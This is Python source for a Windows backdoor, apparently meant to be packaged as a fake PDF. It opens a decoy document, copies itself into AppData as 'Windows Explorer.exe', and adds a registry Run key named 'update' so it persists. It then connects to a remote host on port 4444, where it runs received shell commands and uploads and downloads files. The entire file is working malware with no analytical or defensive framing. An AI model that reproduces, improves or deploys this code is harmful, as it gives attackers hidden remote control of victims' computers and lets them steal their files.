#! /usr/bin/env python

import socket, subprocess, json, os, base64, os, platform, sys, shutil

class Backdoor:
	def __init__(self, ip, port):
		self.become_persistant()
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect((ip, port))

	def reliable_send(self, data):
		json_data = json.dumps(data)
		self.connection.send(json_data)
	
	def reliable_receive(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.connection.recv(1024)
				return json.loads(json_data)
			except ValueError:
				continue

	def become_persistant(self):
		evil_file_loc = os.environ["appdata"] + "\\Windows Explorer.exe"
		if not os.path.exists(evil_file_loc):
			shutil.copyfile(sys.executable, evil_file_loc)
			subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_loc + '"', shell=True)
	

	def execute_command(self, command):
		if command[0] == 'exit':
			self.connection.close()
			sys.exit()
		elif command[0] == 'cd' and len(command) > 1:
			return self.change_dir(command[1])
		elif command[0] == 'download':
			return self.read_file(command[1])
		elif command[0] == 'upload':
			return self.write_file(command[1], command[2])
		elif command[0] == 'info':
			return "name of os: " + os.name + "\n" + "name of os system: " + platform.system() + "\n" + "version of os: " + platform.release() + "\n"
		else:
			DEVNULL = open(os.devnull, 'wb')
			return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)

	def change_dir(self, path):
		os.chdir(path)
		return "[+] Changeing working directory to " + path

	def read_file(self, path):
		with open(path, "rb") as file:
			return base64.b64encode(file.read())

	def write_file(self, path, content):
		with open(path, "wb") as file:
			file.write(base64.b64decode(content))
			return "[+] Upload Successful"

	def run(self):
		while True:
			command = self.reliable_receive()
			try:
				command_result = self.execute_command(command)
			except Exception:
				command_result = "[-] Error executing Command."
			self.reliable_send(command_result)

file_name = sys._MEIPASS + "\cyber.pdf"
subprocess.Popen(file_name, shell=True)

try:
	my_backdoor = Backdoor("172.16.93.128", 4444)
	my_backdoor.run()
except Exception:
	sys.exit()
